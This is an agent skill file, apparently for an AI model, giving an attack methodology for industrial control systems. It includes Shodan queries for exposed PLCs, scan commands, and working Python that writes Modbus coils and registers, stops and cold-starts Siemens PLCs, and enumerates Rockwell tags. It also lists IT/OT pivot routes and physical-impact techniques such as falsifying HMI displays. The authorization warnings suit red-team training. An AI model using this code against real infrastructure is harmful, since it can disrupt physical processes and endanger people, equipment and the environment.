---
name: ot-ics-attack
description: "OT/ICS industrial control system attack methodology. Use when the target involves SCADA/DCS/PLC systems, when industrial protocols such as Modbus/DNP3/OPC UA/EtherNet-IP are found, or when critical infrastructure security must be assessed. Covers industrial protocol exploitation, PLC attacks, HMI penetration, and IT/OT boundary breach"
zh-signals: "OT/ICS 工控系统攻击方法论，覆盖 SCADA/DCS/PLC、工控协议利用、HMI 渗透与 IT/OT 边界突破。信号:工控安全,SCADA,PLC,Modbus,OPC UA"
when-to-use: >-
  Use when the target involves SCADA/DCS/PLC systems, industrial protocols such as
  Modbus/DNP3/OPC UA/EtherNet-IP, or assessing critical-infrastructure security in
  an authorized, isolated environment.
metadata:
  tags: "ot,ics,scada,plc,modbus,dnp3,opc-ua,hmi,industrial control,critical infrastructure"
  category: "exploit"
  mitre_attack: "T0800,T0801,T0802,T0803,T0831,T0855"
---

# OT/ICS Industrial Control System Attack Methodology

> **⛔ Safety warning**: OT systems control physical processes, and incorrect operations may cause equipment damage, environmental disaster, or personal injury. Test only in an explicitly authorized and safely isolated environment!

## ⛔ Further Reading

- Detailed industrial protocol exploitation payloads → [references/ics-protocol-exploit.md](references/ics-protocol-exploit.md)
- PLC attacks and firmware analysis → [references/plc-attack.md](references/plc-attack.md)

---

## Phase 0: Understanding the OT Environment

### Purdue Model (Network Layers)

```
Level 5: Enterprise Network (IT)
Level 4: Business Planning (ERP/MES)
━━━━━━━━━━━ DMZ / IT-OT boundary ━━━━━━━━━━━
Level 3: Site Operations (Historian/SCADA Server)
Level 2: Area Control (HMI/Engineering WS)
Level 1: Basic Control (PLC/RTU/DCS)
Level 0: Physical Process (sensors/actuators)

Typical attack path: Level 5 → 4 → DMZ → 3 → 2 → 1 → 0
Key breach point: the IT/OT boundary (DMZ misconfiguration)
```

### Common Industrial Protocols

| Protocol | Port | Authentication | Purpose |
|------|------|------|------|
| Modbus TCP | 502 | ⛔ None | Read/write PLC registers |
| DNP3 | 20000 | Optional | Electric power SCADA |
| OPC UA | 4840 | Yes | Data access |
| EtherNet/IP | 44818 | ⛔ None | Rockwell PLC |
| S7comm | 102 | ⛔ None | Siemens PLC |
| BACnet | 47808 | ⛔ None | Building automation |
| FINS | 9600 | ⛔ None | Omron PLC |

## Phase 1: Information Gathering (Passive First)

```bash
# Shodan search for exposed ICS devices
shodan search "port:502 product:Modbus"
shodan search "port:102 product:S7"
shodan search "port:44818 product:EtherNet/IP"
shodan search "port:47808 product:BACnet"

# Scan the target network (⛔ only after authorization, use a low rate)
nmap -sT -Pn -p 102,502,4840,20000,44818,47808 --scan-delay 500ms TARGET_RANGE

# Passive traffic analysis (if a mirror port is available)
tcpdump -i eth0 -w ics_traffic.pcap port 502 or port 102 or port 44818

# Wireshark industrial protocol parsing
# Built-in support: Modbus, DNP3, OPC UA, S7comm, EtherNet/IP
```

## Phase 2: Industrial Protocol Exploitation

### 2.1 Modbus TCP (No Authentication!)

```python
#!/usr/bin/env python3
"""Modbus TCP read/write operations — no authentication required"""
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('TARGET_IP', port=502)
client.connect()

# Read holding registers (get current values/configuration)
result = client.read_holding_registers(address=0, count=10, slave=1)
print(f"Registers: {result.registers}")

# Read coil status (digital output state)
result = client.read_coils(address=0, count=10, slave=1)
print(f"Coils: {result.bits}")

# ⛔ Write operations (change the physical process! only in a safe environment)
# Write a single register
client.write_register(address=0, value=100, slave=1)

# Write a single coil (switch control)
client.write_coil(address=0, value=True, slave=1)  # on
client.write_coil(address=0, value=False, slave=1) # off

client.close()
```

### 2.2 Siemens S7comm

```python
#!/usr/bin/env python3
"""S7comm protocol interaction — Siemens S7-300/400/1200/1500"""
import snap7

# Connect to the PLC
plc = snap7.client.Client()
plc.connect('TARGET_IP', rack=0, slot=1)  # S7-300: slot=2

# Read PLC information
info = plc.get_cpu_info()
print(f"Module: {info.ModuleTypeName}")
print(f"Serial: {info.SerialNumber}")

# Read a data block (DB)
data = plc.db_read(db_number=1, start=0, size=100)
print(f"DB1 data: {data.hex()}")

# Read inputs/outputs
inputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 10)   # inputs
outputs = plc.read_area(snap7.types.Areas.PA, 0, 0, 10)  # outputs

# ⛔ Dangerous operations (only in a safe environment)
# Stop the PLC
plc.plc_stop()
# Start the PLC
plc.plc_cold_start()

plc.disconnect()
```

### 2.3 EtherNet/IP (Rockwell/Allen-Bradley)

```python
#!/usr/bin/env python3
"""EtherNet/IP CIP protocol — no authentication"""
from pycomm3 import LogixDriver

with LogixDriver('TARGET_IP') as plc:
    # Read a tag value
    result = plc.read('MyTag')
    print(f"Tag value: {result.value}")

    # Read multiple tags
    results = plc.read('Tag1', 'Tag2', 'Tag3')
    for r in results:
        print(f"{r.tag}: {r.value}")

    # Get PLC information
    info = plc.get_plc_info()
    print(f"Product: {info['product_name']}")

    # List all tags (information gathering)
    tags = plc.get_tag_list()
    for tag in tags:
        print(f"  {tag['tag_name']}: {tag['data_type_name']}")

    # ⛔ Write
    # plc.write('MotorSpeed', 1000)
```

## Phase 3: HMI/SCADA Server Attacks

```
Common HMI/SCADA vulnerabilities:
├─ Default credentials (admin/admin, administrator/empty)
├─ Unencrypted communications (Modbus/OPC DA in plaintext)
├─ Web HMI SQL injection/XSS
├─ Exposed VNC without a password
├─ Weak RDP credentials (Level 2/3 workstations)
├─ Obsolete operating systems (Windows XP/7/2008 still in use)
└─ Unpatched SCADA software (known CVEs)

Common SCADA software:
├─ Siemens WinCC → numerous CVEs
├─ GE iFix / CIMPLICITY
├─ Schneider ClearSCADA
├─ Wonderware InTouch
├─ Ignition (Inductive Automation)
└─ Kepware KEPServerEX (OPC)
```

## Phase 4: IT/OT Boundary Breach

```
Entering the OT network from IT:
├─ Pivot: Historian server (connected to both IT and OT)
├─ Dual-NIC workstation (Level 3 operator computer)
├─ VPN/remote access channels (TeamViewer/AnyDesk running on the HMI)
├─ Shared file server (shared between IT and OT)
├─ Database server (MES/ERP connected to OT)
└─ Permissive firewall rules (unrestricted callback from OT to IT)
```

## Phase 5: Attack Impact Assessment

```
Potential physical impact of an OT attack:
├─ Change PLC logic → loss of control of the physical process
├─ Modify HMI displays → operators see false data (the Stuxnet technique)
├─ Stop the PLC → production shutdown
├─ Modify safety limits → cross the safety thresholds
└─ Attack the SIS (Safety Instrumented System) and the PLC at the same time → most dangerous

Safety constraints during red team testing:
├─ ⛔ NEVER modify the SIS (Safety Instrumented System)
├─ ⛔ NEVER test write operations on production systems
├─ ✓ Use read-only operations to verify reachability
├─ ✓ Validate writes in an isolated test environment
└─ ✓ Keep in constant communication with the operations team
```

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| pymodbus | Modbus TCP client |
| python-snap7 | Siemens S7 communication |
| pycomm3 | EtherNet/IP CIP |
| Wireshark + ICS dissectors | Protocol analysis |
| PLCScan | PLC enumeration |
| ISF (Industrial Exploitation Framework) | ICS exploitation framework |
| GRASSMARLIN | OT network topology discovery |
| Shodan/Censys | Exposure discovery |

